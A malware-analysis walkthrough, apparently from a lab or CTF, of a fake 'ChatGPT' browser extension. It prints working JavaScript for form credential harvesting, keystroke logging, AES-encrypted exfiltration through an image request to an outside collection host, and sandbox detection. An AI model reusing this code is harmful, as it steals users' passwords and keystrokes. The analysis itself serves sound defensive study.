## Scenario

Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

**Your task** is to perform a thorough analysis of this extension identify its malicious components.

-----

## Static Analysis

Browser extensions are small software programs that enhance browser functionality and are typically built using web technologies like HTML, CSS, and JavaScript.

In this case, we are provided with the following files:

![image](https://gist.github.com/user-attachments/assets/fbcc5157-1641-4861-b0f1-69f9ea384ded)

But first we can understand the typical structure of a browser extension. 

### manifest.json

We have a file called `manifest.json` which is the **core configuration file** of a browser extension. It defines the metadata, functionality, permissions, and behavior of the extension. Browsers like Chrome, Firefox, and Edge use this file to understand what the extension does, how it interacts with the browser, and which resources it needs access to.

![image](https://gist.github.com/user-attachments/assets/98135f6a-0599-4f0d-8935-98698fd7ab08)

Where:

- `"manifest_version": 2` : *Specifies the manifest version.*
- `"name": "ChatGPT"` : *Is the name of the extension, as displayed in the browser extension menu.*
- `"version": "1.0"` : *Is the version of the extension.*
- `"description": "An AI-powered assistant extension."` : *Describes what the extension does. This is shown in the extension store or browser settings.*
- The permissions requested include:
	- `"tabs"`: *which allows access to all tabs and their metadata, potentially for tracking user activity.*
	- `"http://*/*"` and `"https://*/*"`: *grants access to all websites, enabling interception or modification of web requests.*
	- `"webRequest"` and `"webRequestBlocking"`: *can intercept and block network requests, and potentially used for injecting malicious scripts or redirecting traffic.*
	- `"cookies"`: *allows reading, setting, and deleting cookies, which can lead to session hijacking.*
- `background` Script: `system/loader.js` *is marked as persistent. Persistent background scripts can continuously run in the background, potentially performing unauthorized actions like data exfiltration or beaconing to a command-and-control (C2) server.*
- **`content_scripts`**: *The content script (`core/app.js`) matches `<all_urls>`, meaning it can be injected into every webpage you visit.*
- **UI (`assets/ui.html`)**: *Provides a front-end interface for the extension.*


With the above in mind, I was inclined to think the following:

- The permissions are overly permissive for an extension claiming to be an "AI-powered assistant."
- We can inspect the `loader.js` file to identify potential Network requests to unknown domains or even detect malicious code indicating data harvesting or C2 communication.
- We can also inspect `app.js` for DOM manipulation, Credential harvesting or Keylogging functionalities.

### loader.js

![image](https://gist.github.com/user-attachments/assets/93b0d31c-a367-4da0-b867-0e9236ef9977)

This script does a couple of suspicious things including:

- Checking for virtualized environments:
	- **`navigator.plugins.length === 0`**: *Detects environments with no browser plugins (common in virtual machines or sandboxed environments).*
	- **`/HeadlessChrome/.test(navigator.userAgent)`**: *Checks if the browser is running in headless mode.*
	Once the above checks have been detected, it Displays an alert and uses `chrome.runtime.onMessage.addListener(() => { return false; });` to block communication, effectively disabling the extension.
- It then dynamically loads JavaScript files into the webpage

	```javascript
	function loadScript(url, callback) {
	    var script = document.createElement('script');
	    script.src = url;
	    script.onload = callback;
	    document.head.appendChild(script);
	}
	```
    {: .nolineno }
	
	Where **`url`** is the URL of the script to load and **`callback`**: is the function executed after the script is successfully loaded. In this case:
	```javascript
	loadScript('core/app.js', function() {
	    console.log('Core functionality loaded.');
	});
	```
    {: .nolineno }

From this file, I deduced that:

- The extension avoids running in analysis environments.
- Since the script dynamically loads `core/app.js`, it could be abused to fetch additional, potentially malicious code.

### app.js

![image](https://gist.github.com/user-attachments/assets/5edfe6c8-48ac-4a50-af3f-0fdea6c51bca)

I will try break this down in parts for easier comprehension:

- **Target Website**

```javascript
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```
{: .nolineno }

The string `'d3d3LmZhY2Vib29rLmNvbQ=='` is Base64-encoded. Decoding it reveals:

```bash
➜  echo "d3d3LmZhY2Vib29rLmNvbQ==" | base64 -d
www.facebook.com 
```
{: .nolineno }

This indicates the script specifically targets Facebook, suggesting it is designed for phishing or stealing credentials from Facebook users.

- **Credential Harvesting**

```javascript
document.addEventListener('submit', function(event) {
    let form = event.target;
    let formData = new FormData(form);
    let username = formData.get('username') || formData.get('email');
    let password = formData.get('password');
    
    if (username && password) {
        exfiltrateCredentials(username, password);
    }
});
```
{: .nolineno }

This code listens for the `submit` event on any form. When a form is submitted, it extracts `username` (or `email`) and `password` fields using `FormData`. If both fields are found, it calls `exfiltrateCredentials()` to send the data to a remote server.

- **Keystroke Logging**

```javascript
document.addEventListener('keydown', function(event) {
    var key = event.key;
    exfiltrateData('keystroke', key);
});
```
{: .nolineno }

The script also logs every keypress using the `keydown` event and sends each keystroke to the remote server via `exfiltrateData()`.

- **Data Exfiltration**

    **exfiltrateCredentials** prepares a payload containing the username, password, and the hostname of the current site. It then encrypts the payload with `encryptPayload()` and sends the encrypted payload to the attacker's server with `sendToServer()`.

    ```javascript
    function exfiltrateCredentials(username, password) {
        const payload = { user: username, pass: password, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }
    ```
    {: .nolineno }

    **exfiltrateData** is preety similar to `exfiltrateCredentials`, but used for sending general data (e.g., keystrokes).

    ```javascript
    function exfiltrateData(type, data) {
        const payload = { type: type, data: data, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }
    ```
    {: .nolineno }

- **Payload Encryption**

```javascript
function encryptPayload(data) {
    const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
    return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
}
```
{: .nolineno }

The payload is encrypted with AES encryption using the CryptoJS library.  The **Key** is hardcoded `'SuperSecretKey123'` , The **IV (Initialization Vector)** is randomly generated for each encryption and finally the encrypted payload is converted to Base64 for transmission.

- **Data Transmission**

```javascript
function sendToServer(encryptedData) {
    var img = new Image();
    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
    document.body.appendChild(img);
}
```
{: .nolineno }

Data is exfiltrated to `https://Mo.Elshaheedy.com/collect` using a GET request. Instead of using `fetch()` or `XMLHttpRequest`, an `<img>` tag is dynamically created, and its `src` attribute is set to the server URL with the encrypted data.

> This is a stealthy technique to bypass Content Security Policies (CSPs) that might block traditional network requests.
{: .prompt-warning }


## Conclusion

In conclusion, this analysis uncovers a fake ChatGPT browser extension designed for credential theft and keystroke logging, targeting websites like Facebook. The extension exploits excessive permissions, employs AES encryption for data exfiltration, and uses evasion tactics to bypass sandbox detection. With a hardcoded encryption key and stealthy image-based GET requests, it avoids detection while stealing sensitive user data.
